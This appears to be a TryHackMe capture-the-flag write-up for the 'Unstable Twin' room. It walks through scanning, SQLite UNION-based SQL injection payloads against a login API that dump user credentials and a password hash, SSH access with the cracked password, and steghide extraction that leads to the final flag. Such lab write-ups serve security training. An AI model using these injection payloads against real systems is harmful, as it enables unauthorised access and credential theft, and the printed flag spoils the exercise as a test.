@@ -1,0 +1,336 @@
+Unstable Twin
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.252.75
+Host is up, received echo-reply ttl 63 (0.17s latency).
+Scanned at 2021-05-03 00:05:06 EDT for 21s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 ba:a2:40:8e:de:c3:7b:c7:f7:b3:7e:0c:1e:ec:9f:b8 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP/bNr/nN/6PCa1yFPjA11XH0aZeVg2OMFGyxF3iCBim97a/vA33LYCnDGh7jjSP+wEzu2Xh6whOuRU147tRglKgXMVqMx7GIfBKp92pPnePbCQi6Qy9Sp1hJCIK9Ik2qzYbVOHr6vSJVRGKdZuCDrqip67tHPJSqtDKvuTS8PTcWav17y0IhBrcU2KoGptwml4I/j3RO/aVYblAEKMH0tn9vy59tokTm0CoPXjZCH7KJfL87YAdyacAA6FB2DIFEupf56qGoGNUP9v7AMaF6Uj/5ywDduik/YOdvBR7AVlX2IOaAu4yLRWIh9S4XvlzCB3N+UyQmXRKSzcSyhKXIRJYidCs0SwhCTF+umbmtMAfHghLBz4pkLbhbqrVqkf0GA8wKyG9rX6LSUl6/SwhtAeFPIQxnnP6OHxrcKHy4BooCVNpur5fkioel5VHO90cK0xzlPWGJ8P4HOnDRmLWpyBAmmPjY8BHNB4rLccZLz1e648h7Zs9sFvhjJD8ONgW0=
+|   256 38:28:4c:e1:4a:75:3d:0d:e7:e4:85:64:38:2a:8e:c7 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH7P2OEvegGP6MfdwJdgVn3xIYEH6LXyzBs5hQ5fPpMZDZdHo5a6J2HR+KShaslzYk83WGNBSJt+hQUGv0Kr+Hs=
+|   256 1a:33:a0:ed:83:ba:09:a5:62:a7:df:ab:2f:ee:d0:99 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN0pHtBDjHWNJSlxl5M/LfHJztN6HJzi30Ygi1ysEOJN
+80/tcp open  http    syn-ack ttl 63 nginx 1.14.1
+| http-methods: 
+|_  Supported Methods: HEAD GET OPTIONS
+|_http-server-header: nginx/1.14.1
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.91%E=4%D=5/3%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=608F7687%P=x86_64-pc-linux-gnu)
+SEQ(SP=100%GCD=1%ISR=106%TI=Z%TS=A)
+SEQ(SP=100%GCD=1%ISR=106%TI=Z%II=I%TS=A)
+OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
+WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
+ECN(R=Y%DF=Y%TG=40%W=6903%O=M505NNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=N%TG=40%CD=S)
+
+Uptime guess: 47.680 days (since Tue Mar 16 07:46:49 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=256 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   157.46 ms 10.8.0.1
+2   157.59 ms 10.10.252.75
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 00:05
+Completed NSE at 00:05, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 00:05
+Completed NSE at 00:05, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 00:05
+Completed NSE at 00:05, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.65 seconds
+           Raw packets sent: 84 (7.284KB) | Rcvd: 46 (4.580KB)
+
+
+
+GOBUSTER SCANS:
+===============================================================
+/info                 (Status: 200) [Size: 160]
+/get_image            (Status: 500) [Size: 291]
+
+
+
+IN /INFO DIRECTORY(JSON OBJECT):
+======================================
+"The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure"
+
+
+BURP REQUEST:(BOTH ARE DISPLAYED RANDOMLY ON GIVING REQUEST)
+==============
+1.Build Number: 1.3.6-final
+Server Name: Julias
+
+2.Build Number: 1.3.4-dev
+Server Name: Vincent
+
+
+THE LOGIN API IS FOUND IN /api/login
+
+NOW USING BURP:
+====================
+1.
+
+I TRY TO DO SQL INJECTION USING UNION SELECT QUERIES AND CHECKING THE NUMBER OF COLUMNS
+REQUEST:
+
+username='union+select+1,2--+-&password=tets
+
+REPONSE:
+
+[
+  [
+    1, 
+    2
+  ]
+]
+
+
+THIS MEANS THAT WE HAVE TWO COLUMNS
+
+2.
+
+TRY TO FIND OUT THE SQL TYPE AND IT VERSION:
+REQUEST:
+
+
+username='union+select+sqlite_version(),2--+-&password=tets
+
+
+RESPONSE:
+
+[
+  [
+    "3.26.0", 
+    2
+  ]
+]
+
+
+THIS MEANS THAT THIS IS THE 'MYSQLITE' SERVER
+
+3.
+
+TRYING TO FIND OUT THE NUMBER OF TABLES:
+REQUEST:
+
+username='union+select+(select+tbl_name+from+sqlite_master+where+type+%3d+'table'+and+tbl_name+not+like+'sqlite_%25'+LIMIT+0,1),2--+-&password=tets
+(USING LIMIT CLAUSE WE CAN GET THE DIFFERENT TABLE NAME BY CHANGING THE ARGUMENTS)
+
+RESPONSE:
+
+[
+  [
+    "users", 
+    2
+  ]
+]
+
+THERFORE USING THE SAME COMMAND BUT BY CHANGING THE ARGUMENTS OF THE LIMIT CLAUSE(USE BURP INTRUDER FOR THIS PROCESS) WE CAN GET ALL THE TABLE NAMES:
+
+BUT THE MAIN PROBLEM IN BRUTEFORCING IS THAT, THERE ARE TWO SERVERS RUNNING IN WHICH ONE IS VULNERABLE AND OTHER IS NOT, SO EACH TIME WE HAVE TO SEND THE REQUEST TWICE FOR EACH PAYLOAD (TWO REQUEST FOR EACH PAYLOAD) IN ORDER TO GET THE CORRECT RESULTS
+
+AFTER RUNNING THIS IN BURP INTRUDER, I FIND THAT WE DON'T WANT THAT REQUEST WHICH HAVE 'CONTENT-LENGHT=200' 
+
+WE HAVE TO DO THIS TASK MANUALLY ONLY(WE CAN MAKE A BASH SCRIPT BUT IM LAZY)
+
+
+AFTER MANUALLY SEARCHING WE CAN FIND ONLY TWO TABLES, THE SECOND ONE IS:
+
+[
+  [
+    "notes", 
+    2
+  ]
+]
+
+LETS ENUMERATE THESE BOTH TABLES:
+
+1.
+
+FINDING THE COLUMNS IN THE "USERS" TABLE:
+REQUEST:
+
+username='union+select+(select+sql+from+sqlite_master+where+type+!%3d+'meta'+and+sql+not+NULL+and+name+%3d+'users'),2--+-&password=tets
+
+
+RESPONSE:
+
+[
+  [
+    "CREATE TABLE \"users\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"username\"\tTEXT NOT NULL UNIQUE,\n\t\"password\"\tTEXT NOT NULL UNIQUE,\n\tPRIMARY KEY(\"id\" AUTOINCREMENT)\n)", 
+    2
+  ]
+]
+
+2.
+
+FINDING THE COLUMNS IN "NOTES" TABLE:
+REQUEST:
+
+username='union+select+(select+sql+from+sqlite_master+where+type+!%3d+'meta'+and+sql+not+NULL+and+name+%3d+'notes'),2--+-&password=tets
+
+RESPONSE:
+
+[
+  [
+    "CREATE TABLE \"notes\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"user_id\"\tINTEGER,\n\t\"note_sql\"\tINTEGER,\n\t\"notes\"\tTEXT,\n\tPRIMARY KEY(\"id\")\n)", 
+    2
+  ]
+]
+
+3.
+
+USING "GROUP_CONCAT" CLAUSE WE CAN DUMP THE CONTENTS OF THE TABLES:
+(a).
+
+FOR "USERS":
+
+REQUEST:
+
+username='union+select+(select+group_concat(username||":"||password)+from+users),2--+-&password=tets
+
+RESPONSE:
+
+[
+  [
+    "mary_ann:continue...,julias:Red,vincent:Orange,linda:Green,marnie:Yellow ", 
+    2
+  ]
+]
+
+
+(b).
+
+FOR "NOTES":
+
+REQUEST:
+
+username='union+select+(select+group_concat(user_id||":"||note_sql||":"||notes)+from+notes),2--+-&password=tets
+
+RESPONSE:
+
+[
+  [
+    "1:1:I have left my notes on the server.  They will me help get the family back together. ,1:2:My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n", 
+    2
+  ]
+]
+
+
+LETS CRACK THIS PASSWORD..
+eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4:experiment
+
+
+THE CREDS ARE:
+mary_ann:experiment
+
+
+WE ARE IN:
+=================================
+# ssh mary_ann@10.10.252.75
+mary_ann@10.10.252.75's password: 
+Last login: Sun Feb 14 09:56:18 2021 from 192.168.20.38
+Hello Mary Ann
+[mary_ann@UnstableTwin ~]$ 
+
+GOT THE FLAG
+
+FOUND THIS NOTE:
+==========================
+[mary_ann@UnstableTwin ~]$ cat server_notes.txt 
+Now you have found my notes you now you need to put my extended family together.
+
+We need to GET their IMAGE for the family album.  These can be retrieved by NAME.
+
+You need to find all of them and a picture of myself!
+[mary_ann@UnstableTwin ~]$
+
+
+AFTER READING THIS NOTE, WE CAN SEE SOME "KEYWORDS" WHICH ARE HIGHLIGHTED IN "BOLD", LIKE:
+1.GET
+2.IMAGE
+3.NAME
+------------------------------
+GET MEANS THE GET PARAMETER
+IMAGE MEANS, THOSE IMAGES WE GOT IN THE /opt DIRECTORY
+NAME MEANS WE CAN FETCH THEM USING THE NAMES WE GOT THEM IN THE "USERS" TABLE(MAYBE NAME CAN ALSO BE USE AS A GET PARAMETER?)
+------------------------------
+
+LETS TRY TO FETCH THESE IMAGES FROM CURL COMMAND
+
+(THE IMAGES I GOT IN THE /opt DIRECTORY CANNOT BE COPIED THROUGH SCP, BUT YOU CAN COPY THOSE FILES BY BASE64ing THEM AND THEN DECRYPT THEM
+IN YOU LOCAL MACHINES BUT THE FILES ARE TOO LARGE AND THIS WAY IS VERY HEPTIC)
+
+
+WE ALSO KNOW THAT WE FIND A DIRECTORY NAMED /GET_IMAGE, SO THIS CAN BE USE TO FETCH THE IMAGES:
+
+SO USING THE COMMAND WE CAN GET ALL THE IMAGES:
+====================================================
+# curl -X GET http://10.10.126.2/get_image?name=julias > julias.jpg 
+
+JUST REPLACE THE NAMES WITH THE NAMES YOU FIND IN "USERS" TABLE
+
+
+NOW WE GOT ALL THE IMAGES, USING STEGHIDE ON THESE IMAGES WE GET THE TEXT FILE FROM EACH OF THEM:
+==============================================
+─# steghide extract -sf julias.jpg 
+Enter passphrase: 
+wrote extracted data to "julias.txt".
+
+# steghide extract -sf linda.jpg 
+Enter passphrase: 
+wrote extracted data to "linda.txt".
+
+# steghide extract -sf marnie.jpg 
+Enter passphrase: 
+wrote extracted data to "marine.txt".
+
+# steghide extract -sf mary_ann.jpg 
+Enter passphrase: 
+wrote extracted data to "mary_ann.txt".
+
+# steghide extract -sf vincent.jpg 
+Enter passphrase: 
+wrote extracted data to "vincent.txt".
+
+===========================================
+# cat *.txt
+Red - 1DVsdb2uEE0k5HK4GAIZ
+Green - eVYvs6J6HKpZWPG8pfeHoNG1 
+Yellow - jKLNAAeCdl2J8BCRuXVX
+Orange - PS0Mby2jomUKLjvQ4OSw
+You need to find all my children and arrange in a rainbow!
+
+WE KNOW THAT THE RAINBOW HAS COLOURS IN MNEUMONIC LIKE "VIBGYOR", SO THE LAST FOUR ie "GYOR", WHICH CONTAINS THESE COLOURS 
+SO ARRANGE THEM IN THIS ORDER AND THEN WE GET A HASH:
+
+eVYvs6J6HKpZWPG8pfeHoNG1jKLNAAeCdl2J8BCRuXVXPS0Mby2jomUKLjvQ4OSw1DVsdb2uEE0k5HK4GAIZ
+
+BUT THIS DOES'NT WORK, SO I DECIDED TO PUT THESE IN "ROYG":
+1DVsdb2uEE0k5HK4GAIZPS0Mby2jomUKLjvQ4OSwjKLNAAeCdl2J8BCRuXVXeVYvs6J6HKpZWPG8pfeHoNG1 (BASE62)
+
+GOT THE FINAL FLAG
+
+THM{The_Family_Is_Back_Together}
